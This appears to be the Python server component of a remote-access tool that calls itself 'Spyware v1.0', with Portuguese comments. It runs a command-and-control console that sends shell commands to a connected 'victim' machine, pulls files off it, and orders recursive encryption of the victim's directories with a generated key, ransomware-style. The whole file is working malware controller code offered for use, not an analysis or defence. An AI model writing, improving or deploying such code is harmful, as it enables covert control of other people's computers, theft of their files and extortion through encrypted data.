import socket
import selectors
import sys
import os
import time
from cryptography.fernet import Fernet

_HOST = '192.168.100.165'
_PORT = 9991
_MAX_MSG_SIZE = 4096 # estava 8192

_PORT = int(sys.argv[1]) if len(sys.argv) > 1 else _PORT



def help():
    os.system('cls||clear')
    print(
'{}█████████████████████████████████████████████████████████████████████████████████████████████\n'
  '████████████████████████████████████████████████Spyware v1.0██████████████████████████████████\n'
  '██████████████████▀▀▀░░░░░░░▀▀▀███████████████████████socket.py████████████████████████████████\n'
  '███████████████▀░░░░░░░░░░░░░░░░░▀██████████████████████████████████████████████████████████████\n'
  '██████████████│░░░░░░░░░░░░░░░░░░░│███████/msg <Mensagem> -> Envia uma Mensagem██████████████████\n'
  '█████████████▌│░░░░░░░░░░░░░░░░░░░│▐██████████████████████████████████████████████████████████████\n'
  '█████████████░└┐░░░░░░░░░░░░░░░░░┌┘░██████/cmd <Comando>  -> Envia comandos a máquina██████████████\n'
  '█████████████░░└┐░░░░░░░░░░░░░░░┌┘░░██████da vitima OBS: Os comandos mudam conforme o██████████████\n'
  '█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████sistema operacional da vitima.███████████████████████████\n'
  '█████████████▌░│██████▌░░░▐██████│░▐██████semelhante a um ssh primitivo...█████████████████████████\n'
  '██████████████░│▐███▀▀░░▄░░▀▀███▌│░████████████████████████████████████████████████████████████████\n'
  '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████/cmd cpy <Nome do Arquivo> -> Copia o arquivo████████████\n'
  '█████████████▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██████da máquina da vitima para a sua.█████████████████████████\n'
  '███████████████▄─┘██▌░░░░░░░▐██└─▄█████████████████████████████████████████████████████████████████\n'
  '████████████████░░▐█─┬┬┬┬┬┬┬─█▌░░█████████/cmd cryp <Caminho> -> Criptografa os arquivos███████████\n'
  '███████████████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████████recursivamente usando a chave informada█████████████████\n'
  '████████████████▄░░░└┴┴┴┴┴┴┴┘░░░▄████████████████████████████████████████████████████████████████\n'
  '██████████████████▄░░░░░░░░░░░▄███████████/help -> Exibe essa tela novamente.███████████████████\n'
  '█████████████████████▄▄▄▄▄▄▄███████████████████████████████████████████████████████████████████\n'
  '██████████████████████████████████████████/exit -> Fecha o servidor.██████████████████████████\n'
  '█████████████████████████████████████████████████████████████████████████████████████████████{}\n{}'.format(cores['red'], cores['green'] , 'Digite:', cores['yellow']))




if __name__ == "__main__":
    sel = None
    soc = None
    key = None
    mask = None
    events = None
    addr = None
    conn = None
    resto = None
    ext = None 
    recv_files = [None, None]
    cores = {
        'limpa':'\033[m',
        'red':'\033[31m',
        'green':'\033[32m',
        'yellow':'\033[33m'
    }

    help()

    # Iniciando o seletor como padrão
    sel = selectors.DefaultSelector()
    # Iniciando Socket
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.bind((_HOST, _PORT))
    soc.listen(100)
    soc.setblocking(False)

    # Regsitrando nosso socket com o selector
    sel.register(soc, selectors.EVENT_READ)
    # Registrando o 'stdin' (usuário digitando) com o selector
    sel.register(sys.stdin.fileno(), selectors.EVENT_READ)

    print('{}Servidor Iniciado...{}'.format(cores['green'], cores['yellow']))

    #################################
    # Loop Principal
    #################################
    while True:
        try:
        #if True:
            events = sel.select()

            for key, mask in events:
                # Recebendo nova conexão
                if key.fileobj == soc:
                    conn, addr = soc.accept()
                    conn.setblocking(False)
                    sel.register(conn, selectors.EVENT_READ)
                    print('{}Nova conexão > {}{}'.format(cores['green'], key.fileobj, cores['yellow']))

                # Se o Usuario Digitou Algo
                elif key.fileobj == sys.stdin.fileno():
                    data = sys.stdin.readline() # Substitui o input (bloqueante)

                    # se for Mensagem
                    if data[:4] == '/msg':
                        conn.send(('msg' + data[5:]).encode())



                    # Se for Help
                    if data[:5] == '/help':
                        help()



                    elif data[:5] == '/exit':
                        os.system('cls||clear')
                        print('\n'
                              '{}█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████████████████████████████████████████████████████████████\n'
                                '█████████████▌░│██████▌░░░▐██████│░▐████████████Spyware v1.0███████████████████████████████████████\n'
                                '██████████████░│▐███▀▀░░▄░░▀▀███▌│░███████████████████socket.py████████████████████████████████████\n'
                                '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████████████████████████████████████████████████████████████{}\n'
                              '{}\n'.format(cores['red'], cores['green'], 'Até mais... Espero vê-lo em breve :)', cores['yellow']))

                        sel.unregister(conn)
                        conn.close()
                        ext = True
                        exit()
                        #ext = True
                        #a = (3 / 0)

                    elif data[:4] == '/cmd':
                        if data[5:8] == 'cpy':
                            conn.send(('cmdcpy' + data[9:]).encode())
                            name_arq = (data[9:len(data)-1])
                            print('{}Arquivo Selecionado > {}{}'.format(cores['red'], cores['green'], name_arq, cores['yellow']))
                            # Abrindo arquivo com mesmo nome e guardando na posição 1
                            recv_files[0] = open(name_arq, 'wb')
                            recv_files[1] = None
                            print('{}Recebendo Arquivo...{}'.format(cores['red'], cores['yellow']))
                        elif data[5:9] == 'cryp':
                            encrypt_path = data[10:].strip()
                            key = Fernet.generate_key().decode().strip()
                            print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
                                               .format(cores['red'], cores['yellow'], encrypt_path, cores['red'], cores['green'], key))
                            conn.send(('cmdcryp' + encrypt_path + ':' + key).encode())
                        elif data[5:10] == 'dcryp':
                            decrypt_path = data[11:].strip()
                            key = input('\n{}Digite a chave para descriptografar o caminho {}{}{} > {}{}'.format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], cores['yellow']))
                            print('{}Salve a chave para descriptografar o caminho {}{}{} > {}{}'
                                               .format(cores['red'], cores['yellow'], decrypt_path, cores['red'], cores['green'], key))
                            conn.send(('cmddcryp' + decrypt_path + ':' + key).encode())
                        else:
                            # Se for comandos "normais"
                            conn.send(('cmd' + data[5:]).encode())

                # Se não foi digitado nada, ele recebe as Respostas do cliente aqui
                else:
                    # Recebendo os Dados
                    data = key.fileobj.recv(_MAX_MSG_SIZE)
                    #print(data)

                    # Recuperando o código da mensagem
                    code = data[:3]
                    code = code.decode()

                    if code == 'FIL':
                        # Encontrando o tamanho do arquivo que será recebido
                        pos = 3
                        if recv_files[1] == None:
                            while True:
                                try:
                                    int(data[pos:pos+1].decode())
                                    pos = pos + 1
                                except:
                                    break

                            # Salvando o tamanho do arquivo que não foi recebido ainda
                            recv_files[1] = int(data[3:pos].decode())

                            # Cortando o pedaço da mensagem que já foi utilizado
                            data = data[pos:]

                            # Verificando se ainda sobraram dados para serem tratados
                            while len(data) > 0:
                                #print('A LEN DATA: {}'.format(len(data)))
                                code = data[:3].decode()

                                # Verificação de sanidade, este código não deveria ser executado
                                if code != 'FIL':
                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['yellow']))

                                # Encontrando o tamanho do chunk
                                csize = int(data[3:6].decode())
                                #print('A CSIZE >>>>>> {}'.format(csize))

                                # Verificando se temos o chunk inteiro na mensagem
                                if len(data[6:]) >= csize:
                                    # Temos o pedaço inteiro
                                    chunk = data[6:6 + csize]  # Separando o chunk
                                    data = data[6 + csize:]    # Atualizando a data
                                    recv_files[0].write(chunk) # Escrevendo no arquivo
                                else:
                                    while True:
                                        try:
                                            #print('ELSE')
                                            # É necessário receber mais dados
                                            chunk = data[6:]
                                            #time.sleep(0.01)
                                            data = key.fileobj.recv(csize - len(chunk)) # Aqui fazemos um try para caso ele não consiga receber, ele fica em espera até conseguir.
                                            #print('A LEN CHUNK: {} e LEN DATA: {}\n\n'.format(len(chunk), len(data)))
                                            recv_files[0].write(chunk)
                                            recv_files[0].write(data)
                                            data = ''
                                            break
                                        except:
                                            #print('Aguardando conexão...')
                                            time.sleep(1e-2)

                                # Atualizando dados já recebidos
                                recv_files[1] = recv_files[1] - csize

                            if recv_files[1] <= 0:
                                recv_files[0].close()
                                print('{}Arquivo recebido (em uma mensagem)!{}'.format(cores['green'], cores['yellow']))

                        else:
                            # else recv_files[1] != None
                            # Já recebemos o tamanho do arquivo e possívelmente alguns pedaços
                            csize = int(data[3:6].decode())

                            # Verificando se ainda sobraram dados para serem tratados
                            while len(data) > 0:
                                #print('B LEN DATA: {}'.format(len(data)))
                                code = data[:3].decode()

                                # Verificação de sanidade, este código não deveria ser executado
                                if code != 'FIL':
                                    print('{}Recebemos algo errado!{}'.format(cores['red'], cores['yellow']))

                                # Encontrando o tamanho do chunk
                                csize = int(data[3:6].decode())
                                #print('B CSIZE >>>>>> {}'.format(csize))


                                # Verificando se temos o chunk inteiro na mensagem
                                #print('my dude {} >= {}'.format(len(data[6:]), csize))
                                if len(data[6:]) >= csize:
                                    # Temos o pedaço inteiro
                                    chunk = data[6:6 + csize]  # Separando o chunk
                                    data = data[6 + csize:]    # Atualizando a data
                                    recv_files[0].write(chunk) # Escrevendo no arquivo
                                else:
                                    while True:
                                        try:
                                            #print('ELSE')
                                            # É necessário receber mais dados
                                            chunk = data[6:]
                                            #time.sleep(0.01)
                                            data = key.fileobj.recv(csize - len(chunk)) # Aqui fazemos um try para caso ele não consiga receber, ele fica em espera até conseguir.
                                            #print('B LEN CHUNK: {} e LEN DATA: {}\n\n'.format(len(chunk), len(data)))
                                            recv_files[0].write(chunk)
                                            recv_files[0].write(data)
                                            data = ''
                                            break
                                        except:
                                            #print('Aguardando conexão...')
                                            time.sleep(1e-2)

                                # Atualizando dados já recebidos
                                recv_files[1] = recv_files[1] - csize

                            if recv_files[1] <= 0:
                                recv_files[0].close()
                                print('{}Arquivo recebido! (em várias mensagens){}'.format(cores['green'], cores['yellow']))

                    # Se não for arquivo, ele mostra a resposta do cliente
                    else:
                        if not data:
                            print('{}Cliente Desconectado > {}{}'.format(cores['red'], conn, cores['yellow']))
                            sel.unregister(conn)
                            conn.close()
                            break

                        os.system('cls||clear')
                        print('\n'
                              '{}█████████████░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██████████████████████████████████████████████████████████████\n'
                                '█████████████▌░│██████▌░░░▐██████│░▐████████████Spyware v1.0███████████████████████████████████████\n'
                                '██████████████░│▐███▀▀░░▄░░▀▀███▌│░███████████████████socket.py████████████████████████████████████\n'
                                '█████████████▀─┘░░░░░░░▐█▌░░░░░░░└─▀██████████████████████████████████████████████████████████████{}\n'
                              '{}\n{}'.format(cores['red'], cores['green'], data.decode(), cores['yellow']))

        except OSError as error:
            if ext == True:
                exit()
                break
            # Isso não irá desconectar os clientes... eu acho...
            print('{}Error: Reiniciando Servidor!!!{}'.format(cores['red'], cores['yellow']))
            print(str(error))
            continue
